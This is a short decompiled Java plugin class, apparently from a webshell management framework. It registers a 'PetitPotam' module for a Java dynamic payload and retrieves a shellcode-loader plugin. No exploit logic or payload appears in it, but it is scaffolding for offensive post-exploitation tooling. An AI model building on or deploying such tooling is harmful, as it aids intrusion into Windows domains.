//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.java;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "PetitPotam",
        DisplayName = "PetitPotam"
)
public class PetitPotam extends shells.plugins.generic.PetitPotam {
    public PetitPotam() {
    }

    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
